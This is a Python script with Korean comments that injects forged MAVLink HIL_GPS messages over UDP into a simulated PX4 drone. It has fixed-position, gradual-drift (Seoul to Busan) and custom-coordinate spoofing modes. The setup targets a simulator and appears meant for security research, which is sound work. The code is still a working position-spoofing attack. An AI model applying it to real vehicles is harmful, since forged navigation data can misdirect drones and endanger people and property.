#!/usr/bin/env python3
"""
SITL UDP GPS 스푸핑 - Windows 호환 버전
PX4 v1.14 + pymavlink 2.4.49 + X-Plane 12

연결 방식: udp:0.0.0.0:14540 (양방향 수신/송신)
"""
import os
os.environ['MAVLINK20'] = '1'

import time
import math
import sys
from pymavlink import mavutil

class SITLUDPSpoofer:
    def __init__(self, listen_port=14540):
        """
        Windows 호환 UDP 연결
        
        Args:
            listen_port: 수신 포트 (QGC와 다른 포트 사용)
        """
        # 양방향 UDP 연결 (Windows 호환)
        connection_string = f'udpin:0.0.0.0:{listen_port}'
        print(f"연결 문자열: {connection_string}")
        
        self.master = mavutil.mavlink_connection(
            connection_string,
            source_system=255,
            source_component=190
        )
        self.boot_time = time.time()
        self.target_system = 1
        self.target_component = 1
        
    def wait_heartbeat(self, timeout=30):
        """하트비트 대기"""
        print(f"하트비트 대기 중... (최대 {timeout}초)")
        print("PX4 SITL이 실행 중인지 확인하세요.")
        print("mavlink-router가 이 포트로 메시지를 전달하는지 확인하세요.")
        
        start = time.time()
        while (time.time() - start) < timeout:
            msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
            if msg:
                self.target_system = msg.get_srcSystem()
                self.target_component = msg.get_srcComponent()
                print(f"연결됨! System: {self.target_system}, Component: {self.target_component}")
                return True
        print("타임아웃: 하트비트를 받지 못했습니다.")
        return False
        
    def get_safe_timestamp_us(self):
        """uint64 범위 내 안전한 타임스탬프 (마이크로초)"""
        elapsed = time.time() - self.boot_time
        return int(elapsed * 1e6) & 0xFFFFFFFFFFFFFFFF
    
    def send_hil_gps(self, lat_deg, lon_deg, alt_m,
                     vn_ms=0.0, ve_ms=0.0, vd_ms=0.0,
                     fix_type=3, satellites=12):
        """
        HIL_GPS 메시지 송신
        
        Args:
            lat_deg: 위도 (도)
            lon_deg: 경도 (도)
            alt_m: 고도 (미터, MSL)
        """
        # 단위 변환
        lat_e7 = int(lat_deg * 1e7)
        lon_e7 = int(lon_deg * 1e7)
        alt_mm = int(alt_m * 1000)
        
        # 속도 변환 (m/s → cm/s)
        vn_cms = max(-32768, min(32767, int(vn_ms * 100)))
        ve_cms = max(-32768, min(32767, int(ve_ms * 100)))
        vd_cms = max(-32768, min(32767, int(vd_ms * 100)))
        
        # 지상 속도
        ground_speed_cms = max(0, min(65535, int(math.sqrt(vn_ms**2 + ve_ms**2) * 100)))
        
        # 진행 방향 (cdeg)
        if abs(vn_ms) > 0.1 or abs(ve_ms) > 0.1:
            cog = int(math.degrees(math.atan2(ve_ms, vn_ms)) * 100)
            if cog < 0:
                cog += 36000
        else:
            cog = 0
            
        try:
            self.master.mav.hil_gps_send(
                self.get_safe_timestamp_us(),
                fix_type,
                lat_e7,
                lon_e7,
                alt_mm,
                100,  # eph (HDOP * 100)
                100,  # epv (VDOP * 100)
                ground_speed_cms,
                vn_cms,
                ve_cms,
                vd_cms,
                cog,
                satellites
            )
            return True
        except Exception as e:
            print(f"HIL_GPS 전송 오류: {e}")
            return False
            
    def receive_position(self):
        """현재 드론 위치 수신"""
        msg = self.master.recv_match(type='GLOBAL_POSITION_INT', blocking=False)
        if msg:
            return {
                'lat': msg.lat / 1e7,
                'lon': msg.lon / 1e7,
                'alt': msg.alt / 1000,
                'relative_alt': msg.relative_alt / 1000
            }
        return None
        
    def gradual_spoof(self, start_lat, start_lon, start_alt,
                      target_lat, target_lon, target_alt,
                      duration_s=30, rate_hz=10):
        """
        점진적 GPS 스푸핑
        
        Args:
            start_*: 시작 위치 (현재 위치)
            target_*: 목표 가짜 위치
            duration_s: 스푸핑 소요 시간
            rate_hz: 전송 빈도
        """
        print(f"\n=== 점진적 GPS 스푸핑 시작 ===")
        print(f"시작: {start_lat:.6f}, {start_lon:.6f}, {start_alt:.1f}m")
        print(f"목표: {target_lat:.6f}, {target_lon:.6f}, {target_alt:.1f}m")
        print(f"소요시간: {duration_s}초, 빈도: {rate_hz}Hz")
        
        steps = int(duration_s * rate_hz)
        interval = 1.0 / rate_hz
        
        for i in range(steps + 1):
            progress = i / steps
            
            # 선형 보간
            current_lat = start_lat + (target_lat - start_lat) * progress
            current_lon = start_lon + (target_lon - start_lon) * progress
            current_alt = start_alt + (target_alt - start_alt) * progress
            
            self.send_hil_gps(current_lat, current_lon, current_alt)
            
            # 진행 상황 출력 (10% 단위)
            if i % max(1, steps // 10) == 0:
                print(f"[{progress*100:5.1f}%] 위치: {current_lat:.6f}, {current_lon:.6f}, {current_alt:.1f}m")
                
            time.sleep(interval)
            
        print("스푸핑 완료!")
        
    def constant_spoof(self, lat, lon, alt, duration_s=60, rate_hz=10):
        """
        고정 위치 GPS 스푸핑
        """
        print(f"\n=== 고정 위치 GPS 스푸핑 ===")
        print(f"위치: {lat:.6f}, {lon:.6f}, {alt:.1f}m")
        print(f"지속시간: {duration_s}초")
        
        interval = 1.0 / rate_hz
        start_time = time.time()
        count = 0
        
        while (time.time() - start_time) < duration_s:
            self.send_hil_gps(lat, lon, alt)
            count += 1
            
            if count % (rate_hz * 5) == 0:
                elapsed = time.time() - start_time
                print(f"[{elapsed:.1f}s] GPS 메시지 {count}개 전송됨")
                
            time.sleep(interval)
            
        print(f"완료: 총 {count}개 메시지 전송")


def main():
    print("=" * 60)
    print("SITL UDP GPS 스푸핑 - Windows 호환 버전")
    print("=" * 60)
    print()
    print("사전 요구사항:")
    print("  1. PX4 SITL 실행 중")
    print("  2. QGC 파라미터 설정:")
    print("     - param set SIM_GPS_BLOCK 1")
    print("     - param set MAV_USEHILGPS 1")
    print()
    
    # 포트 선택 (QGC: 14550, API: 14540)
    port = 14540
    print(f"수신 포트: {port}")
    print()
    
    try:
        spoofer = SITLUDPSpoofer(listen_port=port)
    except Exception as e:
        print(f"연결 생성 실패: {e}")
        sys.exit(1)
        
    if not spoofer.wait_heartbeat(timeout=30):
        print("\n연결 실패. 다음을 확인하세요:")
        print("  1. PX4 SITL이 실행 중인가?")
        print("  2. mavlink-router가 포트 14540으로 전달하는가?")
        print("  3. 방화벽이 UDP 포트를 차단하는가?")
        sys.exit(1)
        
    print("\n=== 스푸핑 모드 선택 ===")
    print("1. 고정 위치 스푸핑 (서울 → 부산)")
    print("2. 점진적 스푸핑 (현재 위치 → 부산)")
    print("3. 사용자 정의 좌표")
    
    choice = input("\n선택 (1-3): ").strip()
    
    # 서울/부산 좌표
    SEOUL = (37.5665, 126.9780, 100.0)
    BUSAN = (35.1796, 129.0756, 100.0)
    
    if choice == '1':
        spoofer.constant_spoof(
            lat=BUSAN[0],
            lon=BUSAN[1],
            alt=BUSAN[2],
            duration_s=120,
            rate_hz=10
        )
    elif choice == '2':
        # 현재 위치 획득
        print("현재 위치 획득 중...")
        current_pos = None
        for _ in range(50):
            current_pos = spoofer.receive_position()
            if current_pos:
                break
            time.sleep(0.1)
            
        if current_pos:
            spoofer.gradual_spoof(
                start_lat=current_pos['lat'],
                start_lon=current_pos['lon'],
                start_alt=current_pos['alt'],
                target_lat=BUSAN[0],
                target_lon=BUSAN[1],
                target_alt=BUSAN[2],
                duration_s=60,
                rate_hz=10
            )
        else:
            print("현재 위치를 가져올 수 없습니다. 서울에서 시작합니다.")
            spoofer.gradual_spoof(
                start_lat=SEOUL[0],
                start_lon=SEOUL[1],
                start_alt=SEOUL[2],
                target_lat=BUSAN[0],
                target_lon=BUSAN[1],
                target_alt=BUSAN[2],
                duration_s=60,
                rate_hz=10
            )
    elif choice == '3':
        lat = float(input("위도 (예: 35.1796): "))
        lon = float(input("경도 (예: 129.0756): "))
        alt = float(input("고도 (m, 예: 100): "))
        duration = int(input("지속시간 (초, 예: 60): "))
        
        spoofer.constant_spoof(lat, lon, alt, duration_s=duration, rate_hz=10)
    else:
        print("잘못된 선택")


if __name__ == "__main__":
    main()